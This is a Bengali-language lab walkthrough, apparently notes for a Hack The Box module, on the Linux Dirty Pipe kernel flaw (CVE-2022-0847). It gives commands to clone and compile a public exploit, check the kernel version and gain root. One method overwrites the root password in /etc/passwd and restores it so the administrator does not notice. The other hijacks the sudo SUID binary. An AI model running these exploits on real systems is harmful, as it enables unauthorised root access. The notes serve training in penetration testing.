# Dirty Pipe - [LINK](https://academy.hackthebox.com/app/module/51/section/1597)


লিনাক্স কার্নেলের একটি অত্যন্ত মারাত্মক এবং সুপরিচিত দুর্বলতা হলো **Dirty Pipe (CVE-2022-0847)**। এটি ব্যবহার করে একজন সাধারণ ইউজার লিনাক্স সিস্টেমের রুট (Root) ফাইলগুলোতে অননুমোদিতভাবে ডেটা লিখতে বা পরিবর্তন করতে পারে।

টেকনিক্যালি এটি ২০১৬ সালে আবিষ্কৃত বিখ্যাত 'Dirty COW' দুর্বলতার মতোই কাজ করে। লিনাক্স কার্নেল ভার্সন **5.8 থেকে 5.17** পর্যন্ত সব কার্নেল এই দুর্বলতায় আক্রান্ত।

## ডার্টি পাইপ কীভাবে কাজ করে?

একদম সহজ ভাষায় বললে: এই দুর্বলতাটি ব্যবহার করে একজন ইউজার সিস্টেমের যেকোনো ফাইলে (এমনকি সেটি রুট ইউজারের হলেও) নিজের ইচ্ছামতো ডেটা লিখতে পারবে, **শর্ত হলো— ওই ফাইলটি পড়ার (Read access) পারমিশন তার থাকতে হবে।**

মজার ব্যাপার হলো, অ্যান্ড্রয়েড (Android) ফোনগুলোও লিনাক্স কার্নেল ব্যবহার করায় এই দুর্বলতার শিকার হয়েছিল। কোনো ক্ষতিকর অ্যাপ এই দুর্বলতা কাজে লাগিয়ে পুরো ফোনের কন্ট্রোল নিয়ে নিতে পারত।

এই দুর্বলতাটি মূলত লিনাক্সের **Pipes (পাইপস)** মেকানিজমের ওপর ভিত্তি করে কাজ করে। পাইপ হলো ইউনিক্স সিস্টেমে দুটি প্রসেসের মধ্যে একমুখী (unidirectional) ডেটা আদান-প্রদানের একটি মাধ্যম। ডার্টি পাইপ ব্যবহার করে আমরা চাইলে সরাসরি `/etc/passwd` ফাইলে ডেটা ইনজেক্ট করে রুট ইউজারের পাসওয়ার্ড মুছে ফেলতে পারি এবং কোনো পাসওয়ার্ড ছাড়াই সিস্টেমে রুট হিসেবে লগইন করতে পারি।

## এক্সপ্লয়টেশন (অ্যাটাক করার পদ্ধতি)

এই দুর্বলতাটি কাজে লাগানোর জন্য ইন্টারনেটে আগে থেকেই তৈরি করা প্রুফ-অফ-কনসেপ্ট (PoC) বা এক্সপ্লয়ট পাওয়া যায়। আমরা গিটহাব থেকে এমন একটি এক্সপ্লয়ট ডাউনলোড করে টার্গেট সিস্টেমে কম্পাইল করব।

### ধাপ ১: এক্সপ্লয়ট ডাউনলোড এবং কম্পাইল করা

প্রথমে গিটহাব থেকে ফাইলগুলো ক্লোন করে আনব এবং `compile.sh` স্ক্রিপ্টটি রান করে এক্সপ্লয়টগুলো কম্পাইল করব।

```bash
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh

```

কম্পাইল করার পর আমরা দুটি আলাদা এক্সপ্লয়ট পাব: `exploit-1` এবং `exploit-2`।

### ধাপ ২: কার্নেল ভার্সন চেক করা

অ্যাটাক চালানোর আগে নিশ্চিত হয়ে নেওয়া ভালো যে টার্গেট সিস্টেমের কার্নেল ভার্সনটি দুর্বল কি না (অর্থাৎ ৫.৮ থেকে ৫.১৭ এর মধ্যে কি না)।

```bash
cry0l1t3@nix02:~$ uname -r
5.13.0-46-generic

```

এখানে ভার্সনটি ৫.১৩, তার মানে এটি ডার্টি পাইপে আক্রান্ত।

### অ্যাটাক পদ্ধতি ১: exploit-1 ব্যবহার করে রুট হওয়া

প্রথম এক্সপ্লয়টটি (`exploit-1`) মূলত `/etc/passwd` ফাইলটিকে মডিফাই করে। এটি রান করলে যা হয়:
১. এটি প্রথমে আসল পাসওয়ার্ড ফাইলের একটি ব্যাকআপ (`/tmp/passwd.bak`) তৈরি করে।
২. এরপর এটি রুট ইউজারের পাসওয়ার্ড পরিবর্তন করে **"piped"** সেট করে দেয়।
৩. আপনাকে রুট শেল দিয়ে দেওয়ার পর, এটি ব্যাকআপ থেকে আবার আগের পাসওয়ার্ড রিস্টোর করে দেয়, যাতে সিস্টেম অ্যাডমিন কিছু বুঝতে না পারে।

**কমান্ড:**

```bash
cry0l1t3@nix02:~$ ./exploit-1

```

**আউটপুট:**

```text
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

# id
uid=0(root) gid=0(root) groups=0(root)

```

সফলভাবে আমরা রুট শেল পেয়ে গেছি!

### অ্যাটাক পদ্ধতি ২: exploit-2 ব্যবহার করে রুট হওয়া

দ্বিতীয় এক্সপ্লয়টটি (`exploit-2`) সিস্টেমের SUID বাইনারিগুলোকে হাইজ্যাক করে রুট পারমিশন এনে দেয়। এটি ব্যবহার করার জন্য আমাদের প্রথমে সিস্টেমে থাকা SUID বাইনারিগুলো খুঁজে বের করতে হবে।

**SUID বাইনারি খোঁজার কমান্ড:**

```bash
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

```

আউটপুটে অনেকগুলো বাইনারির নাম আসবে (যেমন: `/usr/bin/sudo`, `/usr/bin/su`, `/usr/bin/passwd` ইত্যাদি)।

**এক্সপ্লয়টেশন:**
এবার আমরা এক্সপ্লয়টটি রান করব এবং আর্গুমেন্ট হিসেবে যেকোনো একটি SUID বাইনারির পুরো পাথ (Path) দিয়ে দেব। উদাহরণস্বরূপ, আমরা `/usr/bin/sudo` কে টার্গেট করছি:

```bash
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

```

**আউটপুট:**

```text
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),...

```

এখানে এক্সপ্লয়টটি প্রথমে `sudo` বাইনারিটিকে হাইজ্যাক করেছে, একটি রুট শেল তৈরি করেছে এবং তারপর বাইনারিটিকে তার আগের অবস্থায় ফিরিয়ে এনেছে। আমরা সরাসরি সিস্টেমের রুট অ্যাক্সেস পেয়ে গেছি।
